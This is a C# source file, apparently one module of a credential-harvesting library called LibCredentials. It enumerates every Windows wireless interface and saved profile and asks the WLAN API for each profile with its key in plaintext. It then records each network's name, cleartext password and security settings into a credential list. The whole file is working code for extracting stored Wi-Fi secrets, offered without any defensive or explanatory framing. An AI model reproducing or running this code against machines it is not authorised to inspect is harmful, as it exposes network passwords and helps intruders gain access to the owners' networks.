using System;
using System.Collections.Generic;
using System.Linq;
using System.Xml.Linq;
using LibCredentials.PInvoke;
using PInvoke;

namespace LibCredentials.Targets
{
    public class Wlan : Target
    {
        protected override void _GetCredentials(List<Credential> credentials)
        {
            const uint dwMaxClient = 2;
            var hClient = IntPtr.Zero;
            uint dwCurVersion;

            if (Wlanapi.WlanOpenHandle(dwMaxClient, IntPtr.Zero, out dwCurVersion, ref hClient) !=
                Win32ErrorCode.ERROR_SUCCESS)
                return;

            IntPtr pIfvectorPtr;
            if (Wlanapi.WlanEnumInterfaces(hClient, IntPtr.Zero, out pIfvectorPtr) != Win32ErrorCode.ERROR_SUCCESS)
                return;

            var pIfvector = new Wlanapi.WLAN_INTERFACE_INFO_LIST(pIfvectorPtr);
            for (uint i = 0; i < pIfvector.DwNumberOfItems; i++)
            {
                IntPtr pProfilevectorPtr;
                Wlanapi.WlanGetProfileList(hClient, pIfvector.InterfaceInfo[i].InterfaceGuid,
                    IntPtr.Zero, out pProfilevectorPtr);

                var pProfilevector = new Wlanapi.WLAN_PROFILE_INFO_LIST(pProfilevectorPtr);
                for (uint j = 0; j < pProfilevector.DwNumberOfItems; j++)
                {
                    var pProfileXml = "";
                    var dwFlags = Wlanapi.WlanProfileGetPlaintextKey;
                    uint dwGrantedAccess = 0;

                    if (Wlanapi.WlanGetProfile(hClient, ref pIfvector.InterfaceInfo[i].InterfaceGuid,
                            pProfilevector.ProfileInfo[j].StrProfileName, IntPtr.Zero, ref pProfileXml, ref dwFlags,
                            ref dwGrantedAccess) == Win32ErrorCode.ERROR_SUCCESS)
                        try
                        {
                            var wlanProfile =
                                DynamicXml.Parse(XDocument.Parse(pProfileXml).Elements().First()).WLANProfile;

                            var sharedKey = wlanProfile.MSM.security.sharedKey;
                            credentials.Add(new Credential(TargetTypes.WLan)
                            {
                                Username = wlanProfile.SSIDConfig.SSID.name,
                                Password = sharedKey != null ? sharedKey.keyMaterial : "",
                                Extra =
                                    "Authentication: " + wlanProfile.MSM.security.authEncryption.authentication + " | " +
                                    "Encryption: " + wlanProfile.MSM.security.authEncryption.encryption + " | " +
                                    (sharedKey != null ? "KeyType: " + sharedKey.keyType ?? "none" + " | " : "") +
                                    "ConnectionType: " + wlanProfile.connectionType
                            });
                        }
                        catch
                        {
                        }
                }

                if (pProfilevectorPtr != IntPtr.Zero)
                    Wlanapi.WlanFreeMemory(pProfilevectorPtr);
            }

            if (pIfvectorPtr != IntPtr.Zero)
                Wlanapi.WlanFreeMemory(pIfvectorPtr);
        }
    }
}